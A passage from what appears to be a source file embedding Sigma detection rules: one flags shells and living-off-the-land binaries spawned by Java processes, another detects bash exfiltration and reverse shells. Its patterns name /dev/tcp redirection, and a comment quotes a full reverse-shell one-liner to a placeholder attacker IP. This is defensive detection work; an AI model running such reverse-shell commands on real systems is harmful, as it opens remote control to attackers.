author: SOC Prime Team
tags:
    - attack.initial_access
    - attack.t1190
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        ParentImage|endswith:
            - 'java.exe'
            - 'javaw.exe'
    selection_child:
        Image|endswith:
            - 'pwsh.exe'
            - 'perl.exe'
            - 'ruby.exe'
            - 'wget.exe'
            - 'curl.exe'
            - 'wscript.exe'
            - 'jscript.exe'
            - 'cscript.exe'
            - 'wscript.exe'
            - 'appvlp.exe'
            - 'atbroker.exe'
            - 'bash.exe'
            - 'bginfo.exe'
            - 'bitsadmin.exe'
            - 'cmd.exe' #https://www.picussecurity.com/resource/blog/hunters-international-ransomware; https://www.huntress.com/blog/active-exploitation-solarwinds-web-help-desk-cve-2025-26399; https://thedfirreport.com/2026/02/23/apache-activemq-exploit-leads-to-lockbit-ransomware/
            - 'certutil.exe'
            - 'devtoolslauncher.exe'
            - 'ftp.exe'
            - 'hh.exe'
            - 'ieexec.exe'
            - 'installutil.exe'
            - 'jjs.exe'
            - 'mavinject.exe'
            - 'microsoft.workflow.compiler.exe'
            - 'msbuild.exe'
            - 'msdt.exe'
            - 'mshta.exe'
            - 'msxsl.exe'
            - 'odbcconf.exe'
            - 'powershell.exe'
            - 'presentationhost.exe'
            - 'regasm.exe'
            - 'regsvcs.exe'
            - 'regsvr32.exe'
            - 'rundll32.exe'
            - 'runscripthelper.exe'
            - 'schtasks.exe'
            - 'sqlps.exe'
            - 'sqltoolsps.exe'
            - 'syncappvpublishingserver.exe'
            - 'tracker.exe'
            - 'verclsid.exe'
            - 'vsjitdebugger.exe'
            - 'wmic.exe'
            - 'wsl.exe'
    filters:
        CommandLine|contains:
            - 'storcli64' #cmd /c .\libs\native\storcli64.exe /call/eall/sall show all
            - '\Program Files\Java\jdk-' #cmd.exe /X /C ""C:\Program Files\Java\jdk-23\bin\java" -jar C:\Temp\USR\xxx\surefirebooter-20250210145838756_3.jar C:\Temp\USR\xxx 20
            - 'start excel ' #soft logic
            - 'start winword '
            - 'chcp 437 & ' #soft logic
            - 'FileProtocolHandler'
            - 'powershellWrapper.ps1' # Jenkins
    condition: (selection and selection_child) and not filters
falsepositives:
    - Java Application (which based on java) specific actions, like OS operations, etc.
    - The reliance on the surrounding environment may necessitate the implementation of additional filtering measures to prevent false positives.
level: medium
"#,
  // Possible Data Exfiltration / Reverse Shell via Bash (via cmdline)
  "e4b95599-8caf-41d4-b0a9-26478d133904": r#"title: Possible Data Exfiltration / Reverse Shell via Bash (via cmdline)
id: e4b95599-8caf-41d4-b0a9-26478d133904
status: stable
description: Send local file in the body of an HTTP POST request or using a TCP connection or actions to establish a reverse shell.
author: SOC Prime Team
references:
    - https://hunt.io/blog/ukraine-state-data-exchange-graylog-log4shell
    - https://www.huntress.com/blog/php2shell-leaked-critical-php-vulnerabilities
    - https://unit42.paloaltonetworks.com/ai-campaign-targets-linux-infrastructure/
    - https://unit42.paloaltonetworks.com/modern-kubernetes-threats/
    - https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-022a
    - https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-249a
    - https://gtfobins.github.io/gtfobins/bash/
    - https://www.intel471.com/blog/cve-2026-1731-finding-a-critical-rce-in-an-age-of-ai-driven-vulnerability-research
tags:
    - attack.exfiltration
    - attack.t1048.001
    - attack.execution
    - attack.t1059.004
    - attack.command_and_control
    - attack.t1095
logsource:
    category: process_creation
    product: linux
detection:
    selection:
        Image|endswith: 'sh' #bash/sh/zsh etc.
    selection_vars:
        - CommandLine|contains|all:
            - '/dev/tcp/'
            - 'HTTP'
        - CommandLine|contains|all:
            - '/dev/tcp/' # https://unit42.paloaltonetworks.com/ai-campaign-targets-linux-infrastructure/
            - '0>&1'
    selection_revshell:
        CommandLine|contains:
            - '>& /dev/udp/'
            - '>& /dev/tcp/'
            - '<>/dev/tcp/'
            - '<>/dev/udp/'
            - 'bash -i >&' #/bin/bash -i >& /dev/tcp/attacker-ip/port 0>&1; https://www.intel471.com/blog/cve-2026-1731-finding-a-critical-rce-in-an-age-of-ai-driven-vulnerability-research
    filters:
        Image|endswith: '/docker'
    condition: ((selection and selection_vars) or selection_revshell) and not filters
falsepositives:
    - Trubleshooting activity.
level: high
